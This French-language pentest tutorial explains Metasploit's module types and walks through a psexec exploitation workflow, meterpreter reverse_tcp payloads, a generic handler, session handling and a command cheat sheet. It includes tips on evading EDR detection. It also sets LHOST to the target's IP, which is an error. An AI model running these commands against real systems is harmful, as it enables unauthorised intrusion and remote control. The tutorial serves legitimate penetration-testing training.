# Automatisation avec Metasploit

## Pourquoi

Metasploit est le framework d'exploitation le plus utilise en pentest. Il automatise la chaine complete : reconnaissance, exploitation, livraison de payload, gestion des sessions. Comprendre son fonctionnement est indispensable, meme si certains examens ou engagements en limitent l'usage.

## Comment ca marche

Metasploit est organise en modules :

| Type | Role |
|---|---|
| `exploit/` | Exploite une vulnerabilite specifique |
| `auxiliary/` | Scanner, fuzzer, ou outil utilitaire |
| `payload/` | Code execute sur la cible apres exploitation |
| `post/` | Actions post-exploitation |
| `encoder/` | Encode le payload pour eviter la detection |

Un module exploit est combine avec un payload pour former une chaine d'attaque complete. Le payload par defaut pour la plupart des modules Windows est `windows/meterpreter/reverse_tcp`.

## En pratique

### Lancer Metasploit

```bash
sudo msfconsole
```

### Workflow type

**1. Reconnaissance :**

```bash
nmap -sC -sV -Pn <IP_CIBLE>
```

**2. Recherche d'un module :**

```bash
msf6 > search smb
msf6 > search type:exploit platform:windows smb
```

**3. Selection et configuration :**

```bash
msf6 > use exploit/windows/smb/psexec
msf6 > options
msf6 > set RHOSTS <IP_CIBLE>
msf6 > set SMBUser utilisateur
msf6 > set SMBPass motdepasse
msf6 > set LHOST <IP_CIBLE>
msf6 > set LPORT 4444
```

**4. Exploitation :**

```bash
msf6 > exploit
```

**5. Interaction avec la session :**

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
```

### Utiliser un handler generique

Quand on utilise un payload genere avec MSFvenom, le handler multi attend la connexion :

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <IP_CIBLE>
msf6 > set LPORT 4444
msf6 > exploit -j
```

L'option `-j` lance le handler en arriere-plan.

### Gestion des sessions

```bash
msf6 > sessions -l        # lister les sessions
msf6 > sessions -i 1      # interagir avec la session 1
meterpreter > background   # repasser en arriere-plan
```

## Pieges et galeres

- Ne jamais executer un module sans comprendre ce qu'il fait. Certains exploits (comme EternalBlue) peuvent provoquer un BSOD sur la cible.
- Le payload par defaut n'est pas toujours le bon. Verifier l'architecture (x86/x64) et le type (staged/stageless).
- Meterpreter est tres detecte par les EDR modernes. En environnement securise, un shell reverse basique peut etre plus discret.
- Les sessions Meterpreter expirent apres un certain temps d'inactivite. Configurer `set SessionExpirationTimeout 0` pour les sessions longues.

## Retour terrain

Metasploit est un accelerateur formidable en lab et en engagement, mais s'y appuyer exclusivement est une erreur. Les cibles securisees bloquent les payloads Meterpreter standards. L'outil est surtout precieux pour sa base de donnees de modules (reconnaissance, verification de vulnerabilites) et pour le handler generique qui accepte les connexions de payloads MSFvenom personnalises.

## Memo express

| Action | Commande |
|---|---|
| Lancer MSF | `sudo msfconsole` |
| Chercher un module | `search mot_cle` |
| Selectionner | `use chemin/module` |
| Configurer | `set OPTION valeur` |
| Exploiter | `exploit` ou `run` |
| Handler generique | `use exploit/multi/handler` |
| Lister les sessions | `sessions -l` |
| Interagir | `sessions -i N` |

***
